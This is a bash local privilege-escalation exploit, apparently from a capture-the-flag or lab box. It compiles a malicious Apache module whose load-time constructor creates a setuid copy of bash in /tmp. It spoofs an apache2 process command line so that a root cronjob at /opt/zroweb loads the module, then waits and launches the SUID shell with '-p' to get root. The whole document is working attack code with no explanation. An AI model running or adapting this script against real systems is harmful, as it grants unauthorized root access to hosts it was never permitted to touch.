#!/bin/bash

TARGET_DIR="/dev/shm"
FILENAME="malicious_module"
BASH_FILE="/tmp/bash0"

cat << EOF > "$TARGET_DIR/$FILENAME.c"
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"

static void myinit() {
    system("cp /bin/bash $BASH_FILE; chmod 6777 $BASH_FILE");
}

__attribute__((constructor))
static void _init() { myinit(); }

module AP_MODULE_DECLARE_DATA mymodule = {
    STANDARD20_MODULE_STUFF,
    NULL,NULL,NULL,NULL,NULL,NULL
};
EOF

apxs -c $TARGET_DIR/$FILENAME.c

mkdir -p $TARGET_DIR/module/modules/
cp $TARGET_DIR/.libs/$FILENAME.so $TARGET_DIR/module/modules/

cat << EOF > "$TARGET_DIR/module/apache2.conf"
LoadModule $FILENAME modules/$FILENAME.so
EOF

cat << EOF > "$TARGET_DIR/module/fake_process.py"
import os

os.execv('/bin/sleep', ['/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d $TARGET_DIR/module -c', "223"])
EOF

python3 $TARGET_DIR/module/fake_process.py &
echo "[?] Wait for cronjob ..."
while true; do
    if [[ -f "$BASH_FILE" ]]; then
        echo "[+] $BASH_FILE is there!"
        bash -c "$BASH_FILE -p"
        break
    fi
    sleep 1
done
